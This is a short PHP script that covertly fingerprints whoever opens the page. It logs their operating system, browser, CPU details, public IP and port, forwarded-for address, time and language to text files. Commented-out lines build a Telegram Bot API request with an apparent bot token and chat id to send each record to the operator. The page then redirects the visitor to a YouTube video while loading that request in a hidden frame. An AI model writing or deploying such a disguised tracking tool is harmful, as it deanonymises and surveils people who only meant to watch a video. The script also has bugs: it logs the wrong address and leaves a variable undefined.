<?php

require_once( 'core'.DIRECTORY_SEPARATOR.'autoload.php' );

use Core\UserAgent;

	$instance = new UserAgent();

	$text = "NEW ACCESS!!: \n";

	if ($instance->systemString)
		$text = $text."OS: $instance->systemString \n";

	if ($instance->browserVersion)
		$text = $text."BROWSER VERSION: $instance->browserVersion \n";

	if ($instance->browserName)
		$text = $text."BROWSER NAME: $instance->browserName \n";

	if ($instance->mobileName)
		$text = $text."MOBILE NAME: $instance->mobileName \n";

	if ($instance->isPPC)
		$text = $text."CPU BRAND: $instance->isPPC \n";

	if ($instance->isIntel)
		$text = $text."CPU BRAND: $instance->isIntel \n";

	if ($instance->osArch)
		$text = $text."CPU BRAND: $instance->osArch \n";

	if ($instance->osVersion)
		$text = $text."OS VERSION: $instance->osVersion \n";
	
	if ($instance->osPlatform)
		$text = $text."OS PLATFORM: $instance->osPlatform \n";
	

	$remote_address = $_SERVER['REMOTE_ADDR'].":".$_SERVER['REMOTE_PORT'];

	if ($remote_address)
		$text = $text."ADRESS (PUBLIC) FROM: $remote_address \n";

	$private_address = $_SERVER['HTTP_X_FORWARDED_FOR'];

	if ($private_address)
		$text = $text."ADRESS (PRIVATE) FROM: $remote_address \n";


	$update_date = $_SERVER['REQUEST_TIME']+7200;
	$my_date = date('Y-m-d H:i:s', $update_date); //+0200


	if ($my_date)
		$text = $text."TIME: $my_date \n";

	$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

	$text = $text."LANGUAGE: $language \n";

	file_put_contents('log.txt', $text, FILE_APPEND);

	$file_name = $update_date.'.txt';

	file_put_contents($file_name, $text, FILE_APPEND);

	# Here, telegram channel instead of bot

	#$TOKEN = "800780198:AAEDxEX3m5ecVae5SF3WUrYSjpLVaMYw_cw";

	#$chat_id = "716949796";

	#$text_order = "Type /log to download and watch it or /file ".$file_name." or go to http://mydomain.atspace.eu/log.txt  or http://mydomain.atspace.eu/".$file_name."\n";

	#$text = $text.$text_order;

	#$url = "https://api.telegram.org/bot".$TOKEN."/sendMessage?chat_id=".$chat_id."&text=".$text;

	echo'<html>
	<head>
		<meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=_w485B6KITg" />
	</head>
	<frameset rows="0,*">
	<frame src="'.$url.'">
	</frameset>
	</html>'
	?>



